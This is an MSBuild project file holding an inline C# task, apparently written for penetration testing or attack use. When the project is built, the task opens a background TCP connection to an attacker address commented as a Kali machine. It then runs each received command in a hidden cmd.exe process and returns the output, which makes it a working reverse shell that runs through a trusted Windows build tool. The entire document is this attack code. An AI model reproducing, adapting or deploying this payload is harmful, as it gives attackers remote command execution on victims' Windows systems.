<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Connect">
    <ReverseShell />
  </Target>
  
  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory" 
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Net.Sockets;
        using System.Diagnostics;
        using System.Text;
        using System.IO;
        using System.Threading;

        public class ReverseShell : Microsoft.Build.Utilities.Task {
            public override bool Execute() {
                Thread thread = new Thread(new ThreadStart(StartShell));
                thread.IsBackground = true;
                thread.Start();
                return true;
            }
            
            private void StartShell() {
                string host = "192.168.1.8";  // Your Kali IP
                int port = 4444;
                
                try {
                    File.WriteAllText("C:\\Windows\\Temp\\msbuild.log", "Starting connection to " + host + ":" + port);
                    
                    using(TcpClient client = new TcpClient(host, port)) {
                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnected! Setting up streams...");
                        
                        NetworkStream stream = client.GetStream();
                        StreamReader reader = new StreamReader(stream);
                        StreamWriter writer = new StreamWriter(stream);
                        writer.AutoFlush = true;
                        
                        // Send initial prompt
                        writer.WriteLine("=== MSBuild Reverse Shell Connected ===");
                        writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
                        
                        string command;
                        while(client.Connected && (command = reader.ReadLine()) != null) {
                            File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nReceived command: " + command);
                            
                            if(command.Trim() == "exit") break;
                            if(string.IsNullOrEmpty(command.Trim())) continue;
                            
                            string result = ExecuteCommand(command.Trim());
                            writer.Write(result);
                            writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
                        }
                        
                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnection closed normally");
                    }
                } catch (Exception ex) {
                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nError: " + ex.Message);
                }
            }
            
            private string ExecuteCommand(string command) {
                try {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    if(!string.IsNullOrEmpty(error)) {
                        output += "\n" + error;
                    }
                    
                    return output;
                } catch(Exception ex) {
                    return "Error: " + ex.Message + "\n";
                }
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
